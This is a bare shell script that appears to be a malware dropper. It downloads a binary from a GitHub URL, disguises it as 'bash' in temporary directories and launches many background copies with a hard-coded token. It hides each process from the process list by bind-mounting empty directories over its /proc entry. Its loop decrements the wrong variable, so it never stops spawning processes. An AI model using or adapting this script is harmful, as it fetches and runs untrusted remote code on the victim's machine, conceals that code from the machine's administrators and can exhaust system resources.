#!/bin/sh

num="40"
token="nI8wrPaUVU4CGUBTBNOszyos9yoAAI1K/RZVoXBwJ/I="
execUrl="https://github.com/vjbahkds/qiyywnbc/raw/refs/heads/main/tm20250312"

execPath="`mktemp -d`/bash"
wget -qO "${execPath}" "${execUrl}"
chmod 777 "${execPath}"

hPid() {
  [ -d "/proc/$1" ] && [ ! -d "/tmp/.proc/$1" ] && mkdir -p "/tmp/.proc/$1" && mount -o bind "/tmp/.proc/$1" "/proc/$1" && return 0 || return 1
}

while [ "$num" -gt "0" ]; do
  execDir=`mktemp -d`;
  execTmp="${execDir}/bash"
  ln -sf "$execPath" "$execTmp";
  cd "${execDir}"
  "${execTmp}" start accept --token "${token}" 2>&1 &
  hPid "$!"
  i=$((i-1)); 
done

hPid "$$"
[ "$1" == "1" ] && wait

